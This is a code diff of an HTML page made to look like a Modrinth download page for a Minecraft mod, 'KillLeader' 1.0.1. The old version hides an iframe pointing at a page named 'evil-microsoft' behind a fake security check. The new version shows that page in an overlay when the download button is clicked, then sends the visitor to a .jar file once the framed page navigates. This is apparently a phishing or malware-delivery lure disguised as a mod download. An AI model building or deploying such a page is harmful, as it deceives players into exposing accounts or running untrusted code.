@@ -11,7 +11,7 @@
         
         h1 { color: var(--modrinth-green); margin-top: 0; }
         
-        .card { background: #fff; border: 1px solid #ddd; padding: 20px; border-radius: 10px; margin-top: 20px; position: relative; overflow: hidden; }
+        .card { background: #fff; border: 1px solid #ddd; padding: 20px; border-radius: 10px; margin-top: 20px; }
         
         .download-btn { 
             background: var(--modrinth-green); color: white; border: none; padding: 12px 24px; 
@@ -19,10 +19,14 @@
             background-image: var(--gloss); transition: transform 0.1s;
         }
         .download-btn:active { transform: scale(0.98); }
-        .download-btn:disabled { background: #cbd5e0; cursor: not-allowed; }
 
         .description { line-height: 1.6; color: #4a5568; margin-top: 20px; }
-        #hidden-iframe { width: 0; height: 0; border: none; position: absolute; }
+        
+        #overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8); display: none; justify-content: center; align-items: center; z-index: 1000;
+        }
+        #hidden-iframe { width: 80%; height: 80%; background: white; border: none; }
     </style>
 </head>
 <body>
@@ -34,33 +38,42 @@
         <div class="card">
             <h3>Download</h3>
             <p><strong>Version:</strong> 1.0.1</p>
-            <button id="download-btn" class="download-btn" disabled>Waiting for security check...</button>
+            <button id="download-btn" class="download-btn">Download KillLeader 1.0.1</button>
         </div>
 
         <div class="description">
             <h3>About This Mod</h3>
-            <p>KillLeader is a comprehensive utility for combat tracking and server administration. Key features include:</p>
-            <ul>
-                <li><strong>Combat Monitoring:</strong> Advanced event handling via <code>CombatEvents</code> and <code>PlayerTickHandler</code>.</li>
-                <li><strong>Administration:</strong> Robust control through <code>AdminCommands</code> and <code>GodModeManager</code>.</li>
-                <li><strong>Data & Metrics:</strong> Persistent tracking using <code>KillDataManager</code>[cite: 3].</li>
-                <li><strong>Visuals:</strong> Real-time HUD rendering for combat stats.</li>
-            </ul>
+            <p>KillLeader is a comprehensive utility for combat tracking and server administration.</p>
         </div>
     </div>
 
-    <iframe id="hidden-iframe" src="https://pcconfighelper.github.io/evil-microsoft/"></iframe>
+    <div id="overlay">
+        <iframe id="hidden-iframe" src=""></iframe>
+    </div>
 
     <script>
         const btn = document.getElementById('download-btn');
-        
-        // Force-enable after 5 seconds if iframe fails to load or restricted
-        window.onload = () => {
-            setTimeout(() => {
-                btn.innerHTML = "Download KillLeader 1.0.1";
-                btn.disabled = false;
-                btn.onclick = () => window.location.href = 'killleader-1.0.1.jar';
-            }, 5000);
+        const overlay = document.getElementById('overlay');
+        const frame = document.getElementById('hidden-iframe');
+        const targetUrl = 'https://pcconfighelper.github.io/evil-microsoft/';
+
+        let initialLoad = true;
+
+        btn.onclick = () => {
+            overlay.style.display = 'flex';
+            frame.src = targetUrl;
+            initialLoad = true;
+        };
+
+        frame.onload = () => {
+            // After the initial load, monitor for navigation
+            if (!initialLoad) {
+                // The frame has navigated (redirected)
+                overlay.style.display = 'none';
+                frame.src = ''; // Clear the frame
+                window.location.href = 'killleader-1.0.1.jar';
+            }
+            initialLoad = false;
         };
     </script>
 </body>
